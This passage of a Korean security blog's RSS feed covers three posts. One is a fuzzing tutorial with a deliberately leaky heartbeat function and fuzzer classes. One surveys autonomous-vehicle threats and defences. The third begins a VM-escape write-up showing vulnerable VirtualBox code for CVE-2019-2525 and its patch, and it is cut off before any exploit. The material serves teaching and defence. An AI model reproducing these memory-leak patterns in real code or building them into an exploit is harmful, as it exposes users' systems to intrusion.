uninitialized_memory_marker</span><br></pre></td></tr></table></figure><ul><li>secrets 문자열을 만든다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heartbeat</span>(<span class="params">reply: <span class="built_in">str</span>, length: <span class="built_in">int</span>, memory: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="comment"># Store reply in memory</span></span><br><span class="line">    memory = reply + memory[<span class="built_in">len</span>(reply):]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send back heartbeat</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        s += memory[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><ul><li>heartbeat 기능을 위와 같이 구현한다.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">heartbeat(<span class="string">&quot;potato&quot;</span>, <span class="number">6</span>, memory=secrets)</span><br><span class="line">heartbeat(<span class="string">&quot;bird&quot;</span>, <span class="number">4</span>, memory=secrets)</span><br><span class="line">heartbeat(<span class="string">&quot;hat&quot;</span>, <span class="number">500</span>, memory=secrets)</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154472897-42298081-e799-480e-b982-93fd7c0b2e84.png" alt="image"></p><ul><li>순서대로 함수를 호출하면 두 번째 인자에 따라 뒤에 출력되는 데이터가 다른 것을 확인할 수 있다.</li><li>어떻게 하면 탐지 할 수 있을까?</li><li>출력하기전에 secret과 uninitialized_memory_marker가 문자열에 있으면 assert.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154480021-c7a877fd-d4c1-4729-ab69-5b676581fa94.png" alt="image"></p><ul><li>퍼징 중에는 항상 가능한 많은 automatic checker를 켜야 한다. </li><li>오류를 탐지할 수 있는 옵션 없이 프로그램만 실행하면 많은 기회를 놓치기 때문이다.</li></ul><h1 id="A-Fuzzing-Architecture"><a href="#A-Fuzzing-Architecture" class="headerlink" title="A Fuzzing Architecture"></a>A Fuzzing Architecture</h1><h2 id="Runner-Classes"><a href="#Runner-Classes" class="headerlink" title="Runner Classes"></a>Runner Classes</h2><ul><li>Runner는 일반적으로 program or function under test이다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Runner</span>:</span></span><br><span class="line">    PASS = <span class="string">&quot;PASS&quot;</span></span><br><span class="line">    FAIL = <span class="string">&quot;FAIL&quot;</span></span><br><span class="line">    UNRESOLVED = <span class="string">&quot;UNRESOLVED&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, inp: <span class="built_in">str</span></span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (inp, Runner.UNRESOLVED)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintRunner</span>(<span class="params">Runner</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, inp</span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="built_in">print</span>(inp)</span><br><span class="line">        <span class="keyword">return</span> (inp, Runner.UNRESOLVED)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramRunner</span>(<span class="params">Runner</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, program: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.program = program</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_process</span>(<span class="params">self, inp: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span>) -&gt; subprocess.CompletedProcess:</span></span><br><span class="line">        <span class="keyword">return</span> subprocess.run(self.program, <span class="built_in">input</span>=inp, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, inp: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span>) -&gt; <span class="type">Tuple</span>[subprocess.CompletedProcess, Outcome]:</span></span><br><span class="line">        result = self.run_process(inp)</span><br><span class="line">        <span class="keyword">if</span> result.returncode == <span class="number">0</span>:</span><br><span class="line">            outcome = self.PASS</span><br><span class="line">        <span class="keyword">elif</span> result.returncode &lt; <span class="number">0</span>:</span><br><span class="line">            outcome = self.FAIL</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            outcome = self.UNRESOLVED</span><br><span class="line">        <span class="keyword">return</span> (result,outcome)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinaryProgramRunner</span>(<span class="params">ProgramRunner</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_process</span>(<span class="params">self, inp: <span class="built_in">str</span>=<span class="string">&quot;&quot;</span></span>) -&gt; subprocess.CompletedProcess:</span></span><br><span class="line">        <span class="keyword">return</span> subprocess.run(self.program,<span class="built_in">input</span>=inp.encode(),stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br></pre></td></tr></table></figure><h2 id="Fuzzer-Classes"><a href="#Fuzzer-Classes" class="headerlink" title="Fuzzer Classes"></a>Fuzzer Classes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fuzzer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, runner: Runner = Runner(<span class="params"></span>)</span>) -&gt; <span class="type">Tuple</span>[subprocess.CompletedProcess, Outcome]:</span></span><br><span class="line">        <span class="keyword">return</span> runner.run(self.fuzz())</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runs</span>(<span class="params">self, runner: Runner = PrintRunner(<span class="params"></span>), trials: <span class="built_in">int</span> = <span class="number">10</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[subprocess.CompletedProcess, Outcome]]:</span></span><br><span class="line">        outcomes = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">            outcomes.append(self.run(runner))</span><br><span class="line">        <span class="keyword">return</span> outcomes</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomFuzzer</span>(<span class="params">Fuzzer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, min_length: <span class="built_in">int</span> = <span class="number">10</span>, max_length: <span class="built_in">int</span> = <span class="number">100</span>, char_start: <span class="built_in">int</span> = <span class="number">32</span>, char_range: <span class="built_in">int</span> = <span class="number">32</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.min_length = min_length</span><br><span class="line">        self.max_length = max_length</span><br><span class="line">        self.char_start = char_start</span><br><span class="line">        self.char_range = char_range</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        string_length = random.randrange(self.min_length, self.max_length + <span class="number">1</span>)</span><br><span class="line">        out = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, string_length):</span><br><span class="line">            out += <span class="built_in">chr</span>(random.randrange(self.char_start,self.char_start + self.char_range))</span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/02/07/2022-02-16-01_Fuzzing/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Automotive Security Model</title>
      <link>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/</link>
      <guid>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/</guid>
      <pubDate>Mon, 01 Nov 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;자율주행차-서비스&quot;&gt;&lt;a href=&quot;#자율주행차-서비스&quot; class=&quot;headerlink&quot; title=&quot;자율주행차 서비스&quot;&gt;&lt;/a&gt;자율주행차 서비스&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/139845220-3a0c063c-590a-4d89-9e16-95e43bdf8a1c.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;자율주행차 서비스로는 셔틀 및 온-디멘드, 카쉐어링, 주차, 배송, 군집 주행, 어시스턴트, C-ITS 등이 있다.&lt;/li&gt;
&lt;li&gt;차량은 V2X 통신을 위하여 셀룰러 통신, WAVE통신 등을 한다.&lt;/li&gt;
&lt;li&gt;셔틀 및 온-디멘스, 배송 서비스 등은 차량의 각종 정보를 백엔드 인프라로 전송한다.&lt;/li&gt;
&lt;li&gt;군집 주행 및 어시스턴트 서비스는 차량 간 정보를 공유하며 원격 제어 등 편의 기능을 제공한다.&lt;/li&gt;
&lt;li&gt;C-ITS 서비스는 주행 중에 필요한 교통 상황과 도로정보를 실시간으로 제공한다.&lt;/li&gt;
&lt;li&gt;자율주행차 서비스 보안 부분으로는 차량 보안, 백엔드 인프라 보안, 통신 채널 보안 등이 있다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="자율주행차-서비스"><a href="#자율주행차-서비스" class="headerlink" title="자율주행차 서비스"></a>자율주행차 서비스</h2><p><img src="https://user-images.githubusercontent.com/49066484/139845220-3a0c063c-590a-4d89-9e16-95e43bdf8a1c.png" alt="1"></p><ul><li>자율주행차 서비스로는 셔틀 및 온-디멘드, 카쉐어링, 주차, 배송, 군집 주행, 어시스턴트, C-ITS 등이 있다.</li><li>차량은 V2X 통신을 위하여 셀룰러 통신, WAVE통신 등을 한다.</li><li>셔틀 및 온-디멘스, 배송 서비스 등은 차량의 각종 정보를 백엔드 인프라로 전송한다.</li><li>군집 주행 및 어시스턴트 서비스는 차량 간 정보를 공유하며 원격 제어 등 편의 기능을 제공한다.</li><li>C-ITS 서비스는 주행 중에 필요한 교통 상황과 도로정보를 실시간으로 제공한다.</li><li>자율주행차 서비스 보안 부분으로는 차량 보안, 백엔드 인프라 보안, 통신 채널 보안 등이 있다.</li></ul><span id="more"></span><h2 id="자율주행차-서비스-보안-위협"><a href="#자율주행차-서비스-보안-위협" class="headerlink" title="자율주행차 서비스 보안 위협"></a>자율주행차 서비스 보안 위협</h2><p><img src="https://user-images.githubusercontent.com/49066484/139849656-b515d48d-ede2-48ae-b5ab-653bbb622850.png" alt="2"></p><ul><li><p>차량과 벡엔드 인프라가 통신할 때 공격자는 도청 및 데이터 변조를 수행할 수 있고, 백엔드 인프라에 대하여 DoS와 같은 직접적인 공격을 수행할 수 있다.</p></li><li><p>차량에 대해서는 차량 제어기의 인터페이스를 통하여 송수신되는 데이터 또는 저장된 데이터를 도청, 변조하거나 업데이트 패키지를 위변조하여 공격을 수행할 수 있다.</p></li><li><p>차량에 대한 공격</p><ul><li>펌웨어 변조</li><li>차량 원격제어 해킹</li><li>CAN 위변조</li><li>차량 불법 조작</li><li>DoS</li></ul></li><li><p>통신채널에 대한 공격</p><ul><li>통신 도청</li><li>통신 메시지 위변조</li><li>정보 무단 획득</li><li>거짓 정보 제공</li><li>부인</li></ul></li><li><p>백엔드 인프라에 대한 공격</p><ul><li>정보 유출</li><li>권한 상승</li><li>DoS</li></ul></li><li><p>위를 포함한 다양한 어택 벡터가 존재한다.</p></li></ul><h2 id="자율주행차-서비스-보안기술-및-솔루션"><a href="#자율주행차-서비스-보안기술-및-솔루션" class="headerlink" title="자율주행차 서비스 보안기술 및 솔루션"></a>자율주행차 서비스 보안기술 및 솔루션</h2><p><img src="https://user-images.githubusercontent.com/49066484/139851217-951e2cb6-7cb4-49f7-adde-bb94741552cc.png" alt="3"></p><ul><li>보안위협별 대응 보안기술은 아래와 같다.</li><li>차량에 대한 공격 대응 기술<ul><li>펌웨어 변조 : Hardware Security Model, Secure Boot, Secure Debug, Secure Diagnosis …</li><li>차량 원격제어 해킹 : Secure Access, IDS, SecOS …</li><li>CAN 위변조 : IDS, SecOS, Secure Software Update …</li><li>차량 불법 조작 : Secure Access, Secure Diagnosis …</li><li>DoS : IDS</li></ul></li><li>통신채널에 대한 공격 대응 기술<ul><li>통신 도청 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>통신 메시지 위변조 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>정보 무단 획득 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>거짓 정보 제공 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>부인 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li></ul></li><li>백엔드 인프라에 대한 공격 대응 기술<ul><li>정보 유출 : Firewall, DB Encryption, Access Control, Endpoint Detection &amp; Response …</li><li>권한 상승 : Access Control …</li><li>DoS : Firewall …</li></ul></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>https://한국인터넷진흥원.한국/jsp/common/downloadAction.jsp?bno=259&amp;dno=124&amp;fseq=1</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Automotive/">Automotive</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/Automotive/">Automotive</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Car/">Car</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VM Escape using CVE-2019-2525/2548 (2)</title>
      <link>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/</link>
      <guid>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/</guid>
      <pubDate>Wed, 27 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;CVE-2019-2525와 CVE-2019-2548을 이용한 VM exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;CVE-2019-2525&quot;&gt;&lt;a href=&quot;#CVE-2019-2525&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-2525&quot;&gt;&lt;/a&gt;CVE-2019-2525&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;OOB Read in crUnpackExtendGetAttribLocation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Root-Cause&quot;&gt;&lt;a href=&quot;#Root-Cause&quot; class=&quot;headerlink&quot; title=&quot;Root Cause&quot;&gt;&lt;/a&gt;Root Cause&lt;/h3&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;crUnpackExtendGetUniformLocation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; packet_length = READ_DATA(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    GLuint program = READ_DATA(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, GLuint);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name = DATA_POINTER(&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SET_RETURN_PTR(packet_length&lt;span class=&quot;number&quot;&gt;-16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SET_WRITEBACK_PTR(packet_length&lt;span class=&quot;number&quot;&gt;-8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cr_unpackDispatch.GetUniformLocation(program, name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; SET_RETURN_PTR( offset ) do &amp;#123; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        CRDBGPTR_CHECKZ(return_ptr); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        crMemcpy( return_ptr, cr_unpackData + (offset), sizeof( *return_ptr ) ); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;    &amp;#125; while (0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; SET_WRITEBACK_PTR( offset ) do &amp;#123; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        CRDBGPTR_CHECKZ(writeback_ptr); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        crMemcpy( writeback_ptr, cr_unpackData + (offset), sizeof( *writeback_ptr ) ); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;    &amp;#125; while (0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;SET_XX(OFFSET)에서 crMemcpy(XX, cr_unpackData + OFFSET, 8) 연산 후, 값을 guest로 보낸다.&lt;/li&gt;
&lt;li&gt;이 때 OFFSET(packet_length)을  체크하지 않아 16바이트 Memory Leak이 가능하다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>CVE-2019-2525와 CVE-2019-2548을 이용한 VM exploit.</li></ul><h2 id="CVE-2019-2525"><a href="#CVE-2019-2525" class="headerlink" title="CVE-2019-2525"></a>CVE-2019-2525</h2><ul><li>OOB Read in crUnpackExtendGetAttribLocation</li></ul><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendGetUniformLocation</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> packet_length = READ_DATA(<span class="number">0</span>, <span class="keyword">int</span>);</span><br><span class="line">    GLuint program = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name = DATA_POINTER(<span class="number">12</span>, <span class="keyword">const</span> <span class="keyword">char</span>);</span><br><span class="line">    SET_RETURN_PTR(packet_length<span class="number">-16</span>);</span><br><span class="line">    SET_WRITEBACK_PTR(packet_length<span class="number">-8</span>);</span><br><span class="line">    cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_RETURN_PTR( offset ) do &#123; \</span></span><br><span class="line"><span class="meta">        CRDBGPTR_CHECKZ(return_ptr); \</span></span><br><span class="line"><span class="meta">        crMemcpy( return_ptr, cr_unpackData + (offset), sizeof( *return_ptr ) ); \</span></span><br><span class="line"><span class="meta">    &#125; while (0);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_WRITEBACK_PTR( offset ) do &#123; \</span></span><br><span class="line"><span class="meta">        CRDBGPTR_CHECKZ(writeback_ptr); \</span></span><br><span class="line"><span class="meta">        crMemcpy( writeback_ptr, cr_unpackData + (offset), sizeof( *writeback_ptr ) ); \</span></span><br><span class="line"><span class="meta">    &#125; while (0);</span></span><br></pre></td></tr></table></figure><ul><li>SET_XX(OFFSET)에서 crMemcpy(XX, cr_unpackData + OFFSET, 8) 연산 후, 값을 guest로 보낸다.</li><li>이 때 OFFSET(packet_length)을  체크하지 않아 16바이트 Memory Leak이 가능하다.</li></ul><span id="more"></span><h3 id="How-to-patch"><a href="#How-to-patch" class="headerlink" title="How to patch"></a>How to patch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendGetUniformLocation</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> packet_length = READ_DATA(<span class="number">0</span>, <span class="keyword">int</span>);</span><br><span class="line">    GLuint program = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name = DATA_POINTER(<span class="number">12</span>, <span class="keyword">const</span> <span class="keyword">char</span>);</span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK(packet_length))</span><br><span class="line">    &#123;</span><br><span class="line">    crError(<span class="string">&quot;crUnpackExtendGetAttribLocation: packet_length is out of range&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SET_RETURN_PTR(packet_length<span class="number">-16</span>);</span><br><span class="line">    SET_WRITEBACK_PTR(packet_length<span class="number">-8</span>);</span><br><span class="line">    cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>OFFSET(packet_length)을 체크하는 조건문이 추가 되었다.</li></ul><hr><h2 id="CVE-2019-2548"><a href="#CVE-2019-2548" class="headerlink" title="CVE-2019-2548"></a>CVE-2019-2548</h2><ul><li>Integer Overflow in crServerDispatchReadPixels</li></ul><h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 